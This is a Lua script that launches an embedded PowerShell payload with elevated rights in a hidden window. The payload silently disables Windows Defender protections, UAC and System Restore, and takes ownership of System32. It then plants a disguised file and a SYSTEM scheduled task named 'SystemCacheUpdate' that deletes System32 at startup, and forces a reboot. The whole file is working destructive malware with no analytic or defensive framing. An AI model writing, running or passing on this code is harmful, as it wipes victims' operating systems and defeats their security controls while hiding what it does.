local psScript = [[
# Disable Windows Defender silently
Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
Set-MpPreference -DisableBehaviorMonitoring $true -ErrorAction SilentlyContinue
Set-MpPreference -DisableIOAVProtection $true -ErrorAction SilentlyContinue

# Disable User Account Control (UAC) silently
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "EnableLUA" -Value 0 -ErrorAction SilentlyContinue

# Take ownership of the System32 directory silently
Takeown /F C:\Windows\System32 /R /D Y > $null 2>&1

# Grant full control permissions to the current user silently
$currentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
Icacls C:\Windows\System32 /grant $currentUser:F /T > $null 2>&1

# Disable System Restore silently
Disable-ComputerRestore -Drive "C:\" -ErrorAction SilentlyContinue

# Create a payload script to delete System32 after reboot
$payloadScript = @"
# Run this script as Administrator
Remove-Item -Path C:\Windows\System32 -Recurse -Force -ErrorAction SilentlyContinue
"@

# Save the payload script to a file in a hidden location
$payloadPath = "$env:TEMP\SystemCache.dat"
$payloadScript | Out-File -FilePath $payloadPath -Encoding ASCII -ErrorAction SilentlyContinue

# Create a scheduled task to run the payload script after reboot
$taskName = "SystemCacheUpdate"
$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$payloadPath`"" -ErrorAction SilentlyContinue
$trigger = New-ScheduledTaskTrigger -AtStartup -ErrorAction SilentlyContinue
$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest -ErrorAction SilentlyContinue
Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal -ErrorAction SilentlyContinue > $null 2>&1

# Force a restart silently
Restart-Computer -Force -ErrorAction SilentlyContinue
]]

-- Escape double quotes and newlines for PowerShell command
psScript = psScript:gsub('"', '\\"')
psScript = psScript:gsub('\n', '; ')

-- Command to open PowerShell as administrator and execute the embedded script silently
local command = 'powershell -Command "Start-Process powershell -ArgumentList \'-ExecutionPolicy Bypass -WindowStyle Hidden -Command \"' .. psScript .. '\"\' -Verb RunAs"'

-- Execute the command silently
os.execute(command)